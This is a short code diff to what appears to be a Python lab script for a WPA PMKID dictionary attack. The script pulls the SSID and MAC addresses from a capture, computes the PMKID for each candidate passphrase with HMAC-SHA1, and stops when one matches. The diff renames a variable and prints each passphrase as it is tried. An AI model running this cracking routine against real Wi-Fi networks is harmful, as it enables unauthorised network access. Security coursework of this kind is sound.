@@ -46,7 +46,7 @@ name = b"PMK Name"
 ssid = wpa[0].info.decode('utf-8')
 APmac = a2b_hex(wpa[145].addr2.replace(':',''))
 Clientmac = a2b_hex(wpa[145].addr1.replace(':',''))
-pmkid_to_test = wpa[145].original[-20:-4]
+pmkid_expected = wpa[145].original[-20:-4]
 data = name + APmac + Clientmac
 
 
@@ -68,9 +68,10 @@ for passphrase in passphrases:
 	
 	pmkid = hmac.new(pmk, data, hashlib.sha1)
 	print("###############")
-	print("pmkid_to_test : ", pmkid_to_test.hex())
-	print("pmkid         : ", pmkid.hexdigest()[:-8])
-	if pmkid.hexdigest()[:-8] != pmkid_to_test.hex():
+	print("Passphrase being tested : ", passphrase)
+	print("pmkid expected : ", pmkid_expected.hex())
+	print("pmkid          : ", pmkid.hexdigest()[:-8])
+	if pmkid.hexdigest()[:-8] != pmkid_expected.hex():
 		continue
 	print("Passphrase found : ", passphrase)
 	break
